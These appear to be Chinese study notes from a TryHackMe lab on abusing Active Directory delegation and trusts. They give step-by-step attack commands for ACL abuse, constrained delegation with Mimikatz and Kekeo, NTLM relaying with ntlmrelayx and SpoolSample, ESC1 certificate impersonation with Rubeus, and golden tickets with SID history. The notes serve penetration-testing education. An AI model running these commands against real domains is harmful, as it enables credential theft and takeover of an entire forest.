
#### 目录
- [利用访问控制列表 (ACL) 委派](#利用访问控制列表-acl-委派-exploiting-acl-delegation)
- [利用 Kerberos 委派](#利用-kerberos-委派-exploiting-kerberos-delegation)
- [利用认证中继](#利用认证中继-exploiting-authentication-relaying)
- [利用 AD 证书服务](#利用-ad-证书服务-ad-cs-exploiting-ad-certificate-services)
- [利用域信任](#利用域信任-exploiting-domain-trusts)

#### 概述 (Overview)

在 Active Directory (AD) 中，**委派 (Delegation)** 是一项核心功能，它允许将特定的权限和特权授予非管理员用户或服务，以实现分布式管理。例如，域管理员 (DA) 可以将“重置用户密码”的权限委派给帮助台团队，而无需授予他们完全的管理权限。

然而，委派的实现机制——无论是基于**访问控制列表 (ACL)**、**Kerberos** 还是**域信任**——如果配置不当，都会产生严重的安全漏洞。攻击者可以利用这些配置错误来提升权限、横向移动，甚至完全控制整个 AD 林。本节将探讨几种利用委派和信任关系的高级攻击技术。

---

#### 利用访问控制列表 (ACL) 委派 (Exploiting ACL Delegation)

- 基本原理 (Fundamentals)：
    
    AD 中几乎所有对象的权限都由其访问控制列表 (Discretionary Access Control List, DACL) 控制。DACL 由一系列访问控制条目 (Access Control Entries, ACEs) 组成，每个 ACE 定义了某个安全主体（用户或组）对该对象拥有的特定权限。当这些 ACE 被错误地授予过于宽泛的权限时，就会产生可利用的漏洞。
    
- **常见可利用的 ACE (Commonly Exploitable ACEs)**：
    
    - **ForceChangePassword**: 允许在不知道当前密码的情况下，为目标用户设置新密码。
    - **AddMembers**: 允许向目标组添加成员，包括攻击者自己的账户。
    - **GenericAll**: 赋予对目标的完全控制权，包括上述所有权限。
    - **GenericWrite**: 允许修改目标对象的所有非保护属性，例如通过修改用户的 `scriptPath` 属性，在用户下次登录时执行恶意脚本。
    - **WriteOwner**: 允许更改目标对象的所有者，从而获取对该对象的完全控制权。
    - **WriteDACL**: 允许修改目标的 DACL，攻击者可以为自己添加 `GenericAll` 权限。
    - **AllExtendedRights**: 允许执行所有扩展权限，包括重置密码等。
- **示例：通过 BloodHound 发现并利用 ACL 攻击路径 (Example: Discovering and Exploiting an ACL Path with BloodHound)**：
    
    - **路径发现 (Path Discovery)**: 假设 BloodHound 发现了一条攻击路径：`Domain Users` 组对 `IT Support` 组拥有 `AddMembers` 权限，而 `IT Support` 组又对 `Tier 2 Admins` 组拥有 `ForceChangePassword` 权限。这是一个典型的、可通过两步完成的权限提升路径。
    - **利用步骤 (Exploitation Steps)**:
        1. **添加组成员 (Add Group Member)**: 使用拥有 `AddMembers` 权限的账户，通过 PowerShell 将攻击者控制的账户添加到 `IT Support` 组。
            
            PowerShell
            
            ```
            # 将当前用户添加到 "IT Support" 组
            Add-ADGroupMember -Identity "IT Support" -Members "Your.AD.Account.Username"
            
            # 验证是否成功
            Get-ADGroupMember -Identity "IT Support"
            ```
            
        2. **强制修改密码 (Force Password Change)**: 成为 `IT Support` 成员后，攻击者便继承了对 `Tier 2 Admins` 的 `ForceChangePassword` 权限。首先，枚举目标组成员，然后重置其中一个成员的密码。
            
            PowerShell
            
            ```
            # 枚举 Tier 2 Admins 组的成员
            Get-ADGroupMember -Identity "Tier 2 Admins"
            
            # 为选定的 Tier 2 管理员账户重置密码
            $Password = ConvertTo-SecureString "NewP@ssw0rd123" -AsPlainText -Force
            Set-ADAccountPassword -Identity "t2_lawrence.lewis" -Reset -NewPassword $Password
            ```
            
            完成此步骤后，攻击者即可使用新密码以 Tier 2 管理员的身份进行登录。

---

#### 利用 Kerberos 委派 (Exploiting Kerberos Delegation)

- 基本原理 (Fundamentals)：
    
    Kerberos 委派允许一个服务（如 Web 服务器）冒充一个已认证的用户，去访问另一个服务（如数据库服务器）上的资源。这种机制被广泛用于实现单点登录和多层应用架构。
    
- **委派类型 (Delegation Types)**：
    
    - **无约束委派 (Unconstrained Delegation)**: 最早也是最不安全的类型。如果用户向配置了无约束委派的主机进行认证，该用户的 TGT 会被缓存在主机的内存中。如果攻击者攻陷了该主机，就可以窃取高权限用户的 TGT 并冒充他们。
    - **约束委派 (Constrained Delegation)**: 更安全的类型，它限制了服务账户只能冒充用户去访问**指定**的服务（如 `HTTP/webapp.domain.com`）。
    - **基于资源的约束委派 (Resource-Based Constrained Delegation, RBCD)**: 最新的模型，它反转了控制权。由**资源服务**（如数据库）来指定哪些服务账户可以冒充用户来访问它。
- **示例：约束委派利用 (Example: Constrained Delegation Exploitation)**：
    
    - **发现 (Discovery)**: 使用 PowerSploit 的 `Get-NetUser -TrustedToAuth` 发现 `svcIIS` 服务账户被配置了到 `THMSERVER1` 的 `HTTP` 和 `WSMAN` 服务的约束委派。
    - **凭证获取 (Credential Acquisition)**: 假设攻击者已获得 `THMWRK1` 的管理员权限，且 `svcIIS` 账户正在该主机上运行一个服务。可以使用 Mimikatz 转储 LSA Secrets 来获取 `svcIIS` 账户的明文密码。
        
        PowerShell
        
        ```
        # 在 Mimikatz 中
        token::elevate
        lsadump::secrets
        ```
        
    - **票据伪造与注入 (Ticket Forging and Injection)**:
        1. **获取 TGT**: 使用 Kekeo 和获取到的 `svcIIS` 密码，请求一个该账户的 TGT。
            
            PowerShell
            
            ```
            # 在 Kekeo 中
            tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password123
            ```
            
        2. **伪造 S4U 票据**: 使用上一步的 TGT，通过 S4U2Self 和 S4U2Proxy 协议，伪造一张服务票据 (TGS)，以某个 Tier 1 管理员（如 `t1_trevor.jones`）的身份访问 `THMSERVER1` 的 `HTTP` 和 `WSMAN` 服务。
            
            PowerShell
            
            ```
            # 在 Kekeo 中，为 HTTP 和 WSMAN 服务分别执行
            tgs::s4u /tgt:TGT_svcIIS@...kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
            tgs::s4u /tgt:TGT_svcIIS@...kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
            ```
            
        3. **注入票据 (Pass-the-Ticket)**: 使用 Mimikatz 将伪造好的两张 TGS 票据注入到当前会话中。
            
            PowerShell
            
            ```
            # 在 Mimikatz 中
            kerberos::ptt TGS_t1_trevor.jones@...http...kirbi
            kerberos::ptt TGS_t1_trevor.jones@...wsman...kirbi
            ```
            
    - **访问目标 (Accessing the Target)**: 票据注入后，当前会话即拥有了模拟 `t1_trevor.jones` 访问 `THMSERVER1` 的权限，可以直接建立一个 PowerShell 远程会话。
        
        PowerShell
        
        ```
        Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
        whoami # 输出应为 za\t1_trevor.jones
        ```
        

---

#### 利用认证中继 (Exploiting Authentication Relaying)

- 基本原理 (Fundamentals)：
    
    此攻击的核心是强制一台主机（受害者 A）向攻击者控制的机器进行认证，然后将这个认证过程“中继”到另一台主机（受害者 B），从而以受害者 A 的身份登录受害者 B。
    
- 打印机漏洞 (The Printer Bug)：
    
    MS-RPRN 协议中的一个“功能”（俗称 Print Spooler 漏洞或 PetitPotam），允许任何经过身份验证的域用户强制任何运行了“Print Spooler”服务的主机向任意目标发起认证（通常是 NTLM）。
    
- **示例：通过打印机漏洞中继认证 (Example: Relaying Authentication via the Printer Bug)**：
    
    - **发现 (Discovery)**: BloodHound 发现计算机账户 `THMSERVER2$` 对 `THMSERVER1` 拥有管理员权限。同时，通过 WMI 查询或 Nmap 扫描确认 `THMSERVER2` 正在运行 Print Spooler 服务，且 `THMSERVER1` 和 `THMSERVER2` 的 SMB 服务均未强制要求签名。
    - **设置中继 (Setting up the Relay)**: 在攻击机上，使用 Impacket 工具集中的 `ntlmrelayx.py` 来监听来自 `THMSERVER2` 的认证，并将其转发给 `THMSERVER1`。
        
        Bash
        
        ```
        # -t 指定中继目标, -smb2support 启用 SMBv2 支持
        python3 ntlmrelayx.py -smb2support -t smb://<THMSERVER1_IP>
        ```
        
    - **强制认证 (Coercing Authentication)**: 在一台已控主机上，使用 `SpoolSample.exe` 或其他类似工具触发 `THMSERVER2` 的打印机漏洞，强制其向攻击机的 `ntlmrelayx.py` 监听器进行认证。
        
        PowerShell
        
        ```
        SpoolSample.exe THMSERVER2.za.tryhackme.loc <ATTACKER_IP>
        ```
        
    - **结果 (Result)**: `ntlmrelayx.py` 成功捕获并中继了 `THMSERVER2$` 的认证到 `THMSERVER1`。由于 `THMSERVER2$` 对 `THMSERVER1` 有管理员权限，中继成功，`ntlmrelayx.py` 会自动在 `THMSERVER1` 上转储 SAM 数据库或执行命令，从而实现对 `THMSERVER1` 的控制。

---

#### 利用 AD 证书服务 (AD CS) (Exploiting AD Certificate Services)

- 基本原理 (Fundamentals)：
    
    AD CS 是微软的公钥基础设施 (PKI) 实现。管理员可以创建证书模板 (Certificate Templates)，允许用户和计算机申请证书。如果模板配置不当，攻击者可以申请一个证书来冒充高权限用户，如域管理员。
    
- 寻找可利用的模板 (Finding Vulnerable Templates - ESC1)：
    
    一种常见的被称为 ESC1 的漏洞组合是：
    
    - 模板允许申请者在**证书签名请求 (CSR)** 中指定**备用主题名称 (Subject Alternate Name, SAN)**。
    - 模板颁发的证书可用于**客户端认证 (Client Authentication)**。
    - 攻击者控制的账户拥有申请该模板的**注册权限**。
- **示例：通过 ESC1 漏洞提权 (Example: Privilege Escalation via ESC1)**：
    
    - **请求证书 (Requesting the Certificate)**: 在一台已控主机上，使用 MMC 的证书管理单元（针对本地计算机账户），请求一个基于漏洞模板的新证书。在请求过程中，手动指定 SAN，将**用户主体名称 (UPN)** 设置为目标域管理员的 UPN（如 `Administrator@za.tryhackme.loc`）。
    - **导出证书 (Exporting the Certificate)**: 注册成功后，将颁发的新证书连同其**私钥**一起导出为 `.pfx` 文件，并设置一个保护密码。
    - **模拟用户 (Impersonating the User)**:
        1. **请求 TGT**: 使用 Rubeus 和导出的证书，为 `Administrator` 用户请求一个 Kerberos TGT。
            
            Bash
            
            ```
            Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:pfx_password /domain:za.tryhackme.loc /dc:thm-dc.za.tryhackme.loc
            ```
            
        2. **注入票据 (Pass-the-Ticket)**: 使用 Mimikatz 将 Rubeus 生成的 TGT 票据文件注入到当前会话中。
            
            PowerShell
            
            ```
            # 在 Mimikatz 中
            kerberos::ptt administrator.kirbi
            ```
            
    - **结果 (Result)**: 票据注入后，当前会话即拥有了 `Administrator` 的权限，可以访问域控制器上的 C$ 盘等受限资源。

---

#### 利用域信任 (Exploiting Domain Trusts)

- 基本原理 (Fundamentals)：
    
    在一个多域的 AD 林中，子域和父域（林根域）之间默认存在双向可传递的信任关系。这种信任关系可以被滥用。如果攻击者完全控制了一个子域，他们可以利用这种信任来攻击并控制父域，从而实现对整个林的控制。
    
- 黄金票据与 SID 历史 (Golden Tickets and SID History)：
    
    攻击的核心是伪造一张黄金票据 (Golden Ticket)。通过在票据的特权属性证书 (PAC) 中注入一个来自父域的高权限组的安全标识符 (SID)（例如 Enterprise Admins 组的 SID），可以欺骗父域的资源，使其相信持有该票据的用户是企业管理员。
    
- **示例：子域到林的提权 (Example: Child-to-Forest Escalation)**：
    
    - **信息收集 (Information Gathering)**:
        1. **获取子域 `krbtgt` 哈希**: 在已控的子域 DC 上，使用 Mimikatz 的 `lsadump::dcsync` 功能 dump 出子域 `krbtgt` 账户的 NTLM 哈希。
        2. **获取子域 SID**: 使用 `Get-ADDomain` 获取当前子域的 SID。
        3. **获取父域 `Enterprise Admins` SID**: 使用 `Get-ADGroup` 并指定父域 DC (`-Server thmrootdc.tryhackme.loc`)，获取 `Enterprise Admins` 组的 SID。
    - **伪造黄金票据 (Forging the Golden Ticket)**: 使用 Mimikatz 的 `kerberos::golden` 命令生成并注入黄金票据。
        
        PowerShell
        
        ```
        # 在 Mimikatz 中
        kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<child_domain_sid> /krbtgt:<child_domain_krbtgt_hash> /sids:<parent_domain_enterprise_admins_sid> /ptt
        ```
        
        - `/domain` 和 `/sid` 使用子域的信息。
        - `/krbtgt` 使用子域 `krbtgt` 的哈希。
        - `/sids` 注入父域 `Enterprise Admins` 的 SID。
        - `/ptt` 直接将票据注入内存。
    - **验证访问 (Verifying Access)**: 票据注入后，尝试访问父域 DC 的 C$ 盘。
        
        Bash
        
        ```
        dir \\thmrootdc.tryhackme.loc\c$
        ```
        
        如果命令成功，则证明攻击者已利用域信任关系，从子域管理员成功提升为整个林的管理员。